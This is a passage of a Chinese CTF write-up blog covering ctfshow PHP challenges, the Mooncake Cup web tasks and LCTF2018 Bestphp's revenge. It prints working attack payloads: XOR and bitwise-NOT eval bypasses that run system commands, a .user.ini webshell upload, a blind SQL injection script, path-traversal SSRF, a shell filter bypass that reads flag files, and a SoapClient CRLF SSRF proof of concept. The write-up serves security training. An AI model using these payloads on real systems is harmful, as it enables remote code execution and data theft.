<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, $v3))&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求v1和v2是数字，v3非字母数字和下划线，并且还要绕过return。</p>
<p>关于return这个点，PHP中数字是可以和命令进行一些运算的，比如<code>1-phpinfo()</code>是可以成功执行phpinfo语句的。现在还要利用取反或者异或来绕过preg_match。直接上<a href="https://blog.csdn.net/miuzzx/article/details/109143413">羽师傅的脚本</a>，收藏了。。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v3&#x3D;-(~%8C%86%8C%8B%9A%92)(~%8b%9e%9c%df%99%d5)-&amp;v2&#x3D;1</span><br></pre></td></tr></table></figure>
<h3 id="web142">web142</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1))&#123;</span><br><span class="line">        $d = (<span class="keyword">int</span>)($v1 * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        sleep($d);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;0</span><br><span class="line">?v1&#x3D;0x0</span><br></pre></td></tr></table></figure>
<h3 id="web143">web143</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了±，还可以用*；过滤了~，还可以用异或^</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v3&#x3D;*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)?&gt;&amp;v2&#x3D;1</span><br></pre></td></tr></table></figure>
<h3 id="web144">web144</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; check($v3))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, $v2))&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strlen($str)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>稍微变化一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;(~%8C%86%8C%8B%9A%92)(~%8b%9e%9c%df%99%d5)&amp;v3&#x3D;-</span><br></pre></td></tr></table></figure>
<h3 id="web145">web145</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用三目运算符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v1&#x3D;1&amp;v3&#x3D;?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&amp;v2&#x3D;1</span><br></pre></td></tr></table></figure>
<p>太秀了。</p>
<h2 id="web入门-文件上传">web入门 文件上传</h2>
<h3 id="web153">web153</h3>
<p>使用.user.ini解析绕过</p>
<p>首先上传一个.user.ini文件，内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;01.png</span><br></pre></td></tr></table></figure>
<p>在上传一个01.png的Webshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#39;..&#x2F;flag.php&#39;); ?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web154-155">web154&amp;155</h3>
<p>忘记了。。。</p>
<h3 id="Web156">Web156</h3>
<p>对文件内容进行审查，测试之后发现会拦截关键字php，不过好像可以大小写绕过。但是用了一个骚姿势</p>
<p>还是上传一个.user.ini，并且更改UA</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201026194340.png" alt=""></p>
<p>再上传一个webshell</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201026194513.png" alt=""></p>
<h3 id="web157">web157</h3>
<p>直接包含.user.ini</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201027131213.png" alt=""></p>
<h3 id="web158">web158</h3>
<p>沿用上一个payload</p>
<h3 id="web159">web159</h3>
<p>沿用上一个payload</p>
<h3 id="web160-web161">web160&amp;web161</h3>
<p>web161好像过滤了关键字log</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201027132110.png" alt=""></p>
<h3 id="web162">web162</h3>
<p>折腾了我半天。。包含session文件。</p>
<p>首先在.user.ini文件中直接包含session文件</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201027200514.png" alt=""></p>
<p>上传文件条件竞争</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201027200337.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201027200314.png" alt=""></p>
<h3 id="web163">web163</h3>
<h2 id="web入门-SQL注入">web入门 SQL注入</h2>
<h3 id="web171-172">web171&amp;172</h3>
<p>联合查询注入</p>
<h3 id="web173">web173</h3>
<p>联合查询注入/报错注入</p>
<h2 id="月饼杯">月饼杯</h2>
<h3 id="web1-此夜圆">web1_此夜圆</h3>
<p>考点：PHP反序列化字符串逃逸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;FirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://xz.aliyun.com/t/6718">https://xz.aliyun.com/t/6718</a></p>
<h3 id="web2-故人心">web2_故人心</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b=$_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">$c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">$url[<span class="number">1</span>]=$_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($a) <span class="keyword">and</span> strlen($a)&lt;<span class="number">7</span> <span class="keyword">and</span> $a!=<span class="number">0</span> <span class="keyword">and</span> $a**<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    $d = ($b==hash(<span class="string">&quot;md2&quot;</span>, $b)) &amp;&amp; ($c==hash(<span class="string">&quot;md2&quot;</span>,hash(<span class="string">&quot;md2&quot;</span>, $c)));</span><br><span class="line">    <span class="keyword">if</span>($d)&#123;</span><br><span class="line">             highlight_file(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">             <span class="keyword">if</span>(filter_var($url[<span class="number">1</span>],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                $host=parse_url($url[<span class="number">1</span>]);</span><br><span class="line">                print_r($host); </span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow\.com$/&#x27;</span>,$host[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">                    print_r(file_get_contents($url[<span class="number">1</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;差点点就成功了！&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;please give me url!!!&#x27;</span>;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;想一想md5碰撞原理吧?!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;第一个都过不了还想要flag呀?!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考察PHP的一些特性，第一关就歇菜了。</p>
<p>php小数点后超过161位做平方运算时会被截断，但是超过323位又会失效。用科学计数法来代替，即 <code>1e-162 到 1e-323</code>。</p>
<p>第二关md2弱比较。根据hinthint.txt：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#39;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure>
<p>用Python跑md2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> MD2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md2</span>(<span class="params">s</span>):</span></span><br><span class="line">    obj = MD2.new()</span><br><span class="line">    obj.update(s.encode())</span><br><span class="line">    <span class="keyword">return</span> obj.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">id</span>):</span></span><br><span class="line">    d = <span class="string">&#x27;0e&#x27;</span> + str(id) + <span class="string">&#x27;024452&#x27;</span></span><br><span class="line">    <span class="comment"># d = &#x27;0e&#x27; + str(id) + &#x27;024452&#x27;</span></span><br><span class="line">    enc = md2(d)</span><br><span class="line">    <span class="keyword">if</span> enc[:<span class="number">2</span>] == <span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> enc[<span class="number">2</span>:].isdigit():</span><br><span class="line">        print(d)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">99999</span>):</span><br><span class="line">        <span class="keyword">if</span> check(i):</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>最后b=0e652024452，c=0e603448399</p>
<p>最后一关php会将不认识的协议当作目录，payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;1e-300&amp;b&#x3D;0e652024452&amp;c&#x3D;0e603448399</span><br><span class="line">POST: url&#x3D;a:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt</span><br></pre></td></tr></table></figure>
<h3 id="web3-莫负婵娟">web3_莫负婵娟</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--注意：正式上线请删除注释内容！ --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- username yu22x --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt;</span></span><br></pre></td></tr></table></figure>
<p>测试后发现过滤了<code>' &quot; \ - # % () ^ union, select, sleep </code>等等，闭合sql语句注入应该不行了，再看下发现比较时是<code>like</code>，想到sql通配符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%：用来表示0个或多个字符</span><br><span class="line">_：用来表示任意单个字符</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201029192410.png" alt=""></p>
<p>当测试到32个<code>_</code>字符时，回显发生了变化，简单来说应该是盲注了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://c8b61d08-4760-4f23-834c-eccc201ee37d.chall.ctf.show/login.php&quot;&quot;&quot;</span></span><br><span class="line">strings = string.ascii_letters + string.digits</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">        payload = flag + s + (<span class="number">32</span>-i) * <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;yu22x&quot;</span>, <span class="string">&quot;password&quot;</span>: payload&#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += s</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># 67815b0c009ee970fe4014abaa3Fa6A0</span></span><br></pre></td></tr></table></figure>
<p>登录后发现是一个curl命令执行界面，过滤了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">小写字母 | () &#x2F; \ &#96; * , &lt; &gt; !</span><br></pre></td></tr></table></figure>
<p>还可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大写字母 ? $ &#123; &#125; : ; .</span><br></pre></td></tr></table></figure>
<p>一开始想到DNSLOG外带数据，后来发现可以直接访问VPS外带数据。</p>
<p>题目提示使用环境变量 +linux字符串截取 + 通配符，Linux下环境变量<code>$PATH</code>、<code>$PWD</code>、<code>$HOME</code></p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201029195420.png" style="zoom:50%;" />
<p>再用Linux字符串截断获取<code>cat</code>，以及用通配符表示<code>flag.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip&#x3D;127.0.0.1;$&#123;PATH:7:1&#125;$&#123;PATH:8:1&#125;$&#123;HOME:12:1&#125; ????.???</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题——PHP反序列化</title>
    <url>/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="BUUCTF刷题——PHP反序列化">BUUCTF刷题——PHP反序列化</h1>
<h2 id="LCTF2018-Bestphp’s-revenge">LCTF2018 Bestphp’s revenge</h2>
<blockquote>
<p>这篇文章分析的很到位：<a href="https://www.anquanke.com/post/id/164569#h2-5">https://www.anquanke.com/post/id/164569#h2-5</a></p>
</blockquote>
<h3 id="考点">考点</h3>
<ul>
<li>session反序列化</li>
<li>Soapclient + ssrf</li>
<li>CRLF</li>
</ul>
<h3 id="解题">解题</h3>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">&#x27;f&#x27;</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;name&#x27;</span>] = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>flag.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line">session_start(); </span><br><span class="line">echo &#39;only localhost can get flag!&#39;; </span><br><span class="line">$flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;; </span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123; </span><br><span class="line">	$_SESSION[&#39;flag&#39;] &#x3D; $flag; </span><br><span class="line">&#125; </span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
<p>思路如下：</p>
<ol>
<li>利用第4行回调函数来调用<code>session_start()</code>用于覆盖session序列化引擎为php_serilaze；</li>
<li>构造SSRF的Soap类的序列化字符串配合上面的序列化注入写入session文件，并且构造的序列化字符串中利用了CRLF漏洞写入了我们规定的seesion_id；</li>
<li>然后再通过第4行的回调函数调用<code>extract()</code>函数用于变量覆盖，覆盖掉变量b为回调函数<code>call_user_func</code>；</li>
<li>同时我们可以传入<code>name=SoapClient</code>，那么最后<code>call_user_func($b, $a)</code>就变成<code>call_user_func(array('SoapClient','welcome_to_the_lctf2018'))</code>,即<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code>，由于<code>SoapClient</code>类中没有<code>welcome_to_the_lctf2018</code>这个方法，就会调用魔术方法<code>__call()</code>从而发送请求。</li>
<li>发送请求也就是去访问flag.php，并将结果保存在cookie为第二步我们规定的session_id的文件中。</li>
<li>再用这个session访问主页，就会<code>var_dump</code>session文件的内容，其中就包含字段名为<code>flag</code>的值。</li>
</ol>
<p>先构造POC：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.$payload;</span><br></pre></td></tr></table></figure>
<p>这个poc就是利用crlf伪造请求去访问flag.php并将结果保存在cookie为<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>的session中。</p>
<p>再注入反序列化的字符串：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623152347.png" alt=""></p>
<p>接着触发<code>SoapClient</code>的<code>__call</code>方法发送请求：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623152825.png" alt=""></p>
<p>更改cookie访问：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623152931.png" alt=""></p>
<h3 id="后记">后记</h3>
<p>这道题卡了我一天的时间，还是一个签到题。。。。有一个问题一直困扰我，就是把POC生成的字符串写到session文件后，他是什么时候把session的文件内容给反序列化出来了。后来看了一篇文章才知道：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623153337.png" alt=""></p>
<p>于是就反序列化了一个<code>SoapClient</code>的实例，再调用<code>__call</code>函数的时候就会通过这个实例发送请求。</p>
<h2 id="强网杯2020青龙组-phpweb">强网杯2020青龙组 phpweb</h2>
<h3 id="考点-v2">考点</h3>
<ul>
<li>PHP反序列化</li>
</ul>
<h3 id="解题-v2">解题</h3>
<p>打开题目，查看源码有两个隐藏输入框</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200704180308.png" alt=""></p>
<p>随便输入测试，有一个报错回显，发现这两个输入框是call_user_func函数的参数。</p>
<p>并且基本上过滤危险函数，用file_get_contents读取<code>index.php</code>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span 